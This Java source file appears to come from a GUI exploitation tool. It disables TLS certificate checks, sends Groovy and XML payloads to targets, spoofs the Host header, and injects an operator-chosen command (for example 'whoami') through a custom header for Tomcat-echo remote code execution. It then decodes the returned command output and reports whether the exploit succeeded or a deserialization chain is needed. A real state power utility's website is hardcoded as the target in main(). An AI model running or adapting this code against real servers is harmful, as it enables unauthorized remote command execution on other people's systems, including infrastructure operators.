package org.example;

import okhttp3.*;
import org.apache.commons.lang3.StringEscapeUtils;

import java.awt.event.ActionListener;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.Base64;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class HttpsPostRequestExample {
    public UI UiObject =null ;
    public static void main(String[] args) {
        try {
            // 忽略SSL证书验证
            disableSSLVerification();

            // 发送POST请求
            String url = "http://www.sgcc.com.cn";
            String requestBody = "";
            String hostHeader = "www.sgcc.com.cn";

            String response = sendPostRequest(url, requestBody, hostHeader);

            System.out.println("Response from " + url + ":\n" + response);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void disableSSLVerification() throws Exception {
        // 创建一个信任管理器，用于忽略SSL证书验证
        TrustManager[] trustAllCerts = new TrustManager[] {
                new X509TrustManager() {
                    public X509Certificate[] getAcceptedIssuers() {
                        return null;
                    }

                    public void checkClientTrusted(X509Certificate[] certs, String authType) {
                    }

                    public void checkServerTrusted(X509Certificate[] certs, String authType) {
                    }
                }
        };

        // 获取SSL上下文
        SSLContext sslContext = SSLContext.getInstance("SSL");
        sslContext.init(null, trustAllCerts, new java.security.SecureRandom());

        // 设置默认SSLSocketFactory
        HttpsURLConnection.setDefaultSSLSocketFactory(sslContext.getSocketFactory());
    }
    public static String StringConversion(String originalString) {
            StringBuilder convertedString = new StringBuilder();

            for (char c : originalString.toCharArray()) {
                if(c == '\''){
                    convertedString.append("'\\'' + ");
                }else{
                    convertedString.append("'" + c + "' + ");
                }

            }

            // 删除末尾多余的 " + "
            if (convertedString.length() > 0) {
                convertedString.delete(convertedString.length() - 3, convertedString.length());
            }

           return (convertedString.toString());
        }

    public static String generateRandomString(int length) {
        StringBuilder randomString = new StringBuilder();
        String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

        Random random = new Random();

        for (int i = 0; i < length; i++) {
            int index = random.nextInt(characters.length());
            char randomChar = characters.charAt(index);
            randomString.append(randomChar);
        }

        return randomString.toString();
    }
    public String sendGroovy(String url,String requestBody) throws MalformedURLException, NoSuchAlgorithmException, KeyManagementException {
        URL urlobjec = new URL(url);
        String Host=urlobjec.getHost();
        SSLContext sslContext = SSLContext.getInstance("SSL");
        sslContext.init(null, new TrustManager[]{new TrustAllManager()}, new java.security.SecureRandom());

        // 创建信任所有证书的OkHttpClient
        OkHttpClient client = new OkHttpClient.Builder()
                .sslSocketFactory(sslContext.getSocketFactory(), new TrustAllManager())
                .hostnameVerifier((hostname, session) -> true) // 忽略主机名验证
                .build();
        if(this.UiObject.设置Host头CheckBox.isSelected()){
            Host="127.0.0.1";
        }


        Request request = new Request.Builder()
                .url(url)
                .header("Content-Type", "application/x-www-form-urlencoded") // 设置Host头
                .header("Host", Host) // 设置Host头
                .post(RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), requestBody)) // 设置请求体
                .build();
        try (Response response = client.newCall(request).execute()) {
            if(response.code()!=200){
                throw new Exception("This is a runtime exception!");
            }

            String result =StringEscapeUtils.unescapeHtml4( response.body().string());
            int startIndex = result.indexOf("<command_result>") + "<command_result>".length();
            int endIndex = result.indexOf("</command_result>");

            if (startIndex != -1 && endIndex != -1) {
                // 提取标签内容
                String content = result.substring(startIndex, endIndex);
                this.UiObject.textArea3.setText(new String(Base64.getDecoder().decode(content)));
                return result;
            } else {
                if(this.UiObject.noEchoRadioButton.isSelected()){
                    this.UiObject.textArea3.setText(result);
                }
                if(this.UiObject.parameterErrorEchoRadioButton.isSelected()){
                    this.UiObject.textArea3.setText(result);
                }

                if(result.contains("incompatible") || result.contains("serialVersionUID") || result.contains("BeanComparator")) {
                    this.UiObject.textArea3.setText("The vulnerability exists but the exploitation fails. You need to jump to the deserialization exploit chain, which may lead to unauthorized access.");
                    this.UiObject.textArea3.append("\n");
                    this.UiObject.textArea3.append(result);
                    return result;
                }else if(result.contains("host-headers-allowed")) {
                    this.UiObject.textArea3.setText("This target has been filtered by Host and has been automatically selected. Please reuse it.");
                    this.UiObject.设置Host头CheckBox.setEnabled(true);
                    return result;
                }else if(result.contains("faultCode") &&  result.contains("XML-RPC")){
                    this.UiObject.textArea3.setText("The vulnerability is successfully exploited, but there is a small probability that the exploit will fail.");
                    this.UiObject.textArea3.append("\n");
                    // this.UiObject.textArea2.append(result);
                    return result;

                }else{
                    this.UiObject.textArea2.setText("Exploit failed");
                }

            }
            return response.body().string();
        }catch (Exception error){
            error.printStackTrace();
        }
        return "";
    }
    public String sendXMLPayload(String url, String requestBody) throws IOException, NoSuchAlgorithmException, KeyManagementException {
        // 创建URL对象
        URL urlobjec = new URL(url);
        String Host=urlobjec.getHost();
        SSLContext sslContext = SSLContext.getInstance("SSL");
        sslContext.init(null, new TrustManager[]{new TrustAllManager()}, new java.security.SecureRandom());

        // 创建信任所有证书的OkHttpClient
        OkHttpClient client = new OkHttpClient.Builder()
                .sslSocketFactory(sslContext.getSocketFactory(), new TrustAllManager())
                .hostnameVerifier((hostname, session) -> true) // 忽略主机名验证
                .build();
        if(this.UiObject.设置Host头CheckBox.isSelected()){
            Host="127.0.0.1";
        }
        String CmdLine=  generateRandomString(32);
        String CmdName = generateRandomString(4);
        if(this.UiObject.使用TomcatEcho命令执行RadioButton.isSelected()){
            CmdLine = this.UiObject.whoamiTextField.getText();
            CmdName = "cmd";
        }
        Request request = new Request.Builder()
                .url(url)
                .header("Content-Type", "application/xml") // 设置Host头
                .header("Host", Host) // 设置Host头
                .header(CmdName, CmdLine) // 设置Host头
                .post(RequestBody.create(MediaType.parse("application/xml"), requestBody)) // 设置请求体
                .build();
        try (Response response = client.newCall(request).execute()) {
            if(response.code()!=200){
                throw new Exception("This is a runtime exception!");
            }
            String result =response.body().string();
            int startIndex = result.indexOf("<command_result>") + "<command_result>".length();
            int endIndex = result.indexOf("</command_result>");

            if (startIndex != -1 && endIndex != -1) {
                // 提取标签内容
                String content = result.substring(startIndex, endIndex);
                this.UiObject.textArea2.setText(new String(Base64.getDecoder().decode(content)));
                return result;
            } else {

                if(result.contains("incompatible") || result.contains("serialVersionUID") || result.contains("BeanComparator")) {
                    this.UiObject.textArea2.setText("The vulnerability exists but the exploitation fails. You need to jump to the deserialization exploit chain, which may lead to unauthorized access.");
                    this.UiObject.textArea2.append("\n");
                    this.UiObject.textArea2.append(result);
                    return result;
                }else if(result.contains("host-headers-allowed")) {
                    this.UiObject.textArea2.setText("This target has been filtered by Host and has been automatically selected. Please reuse it.");
                    this.UiObject.设置Host头CheckBox.setEnabled(true);
                    return result;
                }else if(result.contains("faultCode") &&  result.contains("XML-RPC")){
                    this.UiObject.textArea2.setText("The vulnerability is successfully exploited, but there is a small probability that the exploit will fail.");
                    this.UiObject.textArea2.append("\n");
                   // this.UiObject.textArea2.append(result);
                    return result;

                }else{
                    this.UiObject.textArea2.setText("Exploit failed");
                }

            }
            return response.body().string();
        }catch (Exception error){
           error.printStackTrace();
        }
        return "";

    }

    private static class TrustAllManager implements X509TrustManager {
        @Override
        public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {
        }

        @Override
        public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {
        }

        @Override
        public X509Certificate[] getAcceptedIssuers() {
            return new X509Certificate[0];
        }
    }
    private static String sendPostRequest(String url, String requestBody, String hostHeader) throws IOException {
        // 创建URL对象
        URL obj = new URL(url);

        // 打开连接
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();

        // 设置请求方法为POST
        con.setRequestMethod("POST");

        // 设置请求头
        con.setRequestProperty("Host", hostHeader);
        con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        con.setRequestProperty("Content-Length", String.valueOf(requestBody.length()));

        // 允许输出流，用于发送POST请求体
        con.setDoOutput(true);

        // 获取OutputStream对象
        try (OutputStream os = con.getOutputStream()) {
            // 将请求体写入OutputStream
            os.write(requestBody.getBytes());
            os.flush();
        }

        // 获取响应
        int responseCode = con.getResponseCode();
        StringBuilder response = new StringBuilder();

        if (responseCode == HttpURLConnection.HTTP_OK) {
            // 读取响应内容
            try (BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()))) {
                String inputLine;

                while ((inputLine = in.readLine()) != null) {
                    response.append(inputLine);
                }
            }
        } else {
           // System.out.println("HTTP request failed. Response Code: " + responseCode);
        }

        return response.toString();
    }
}
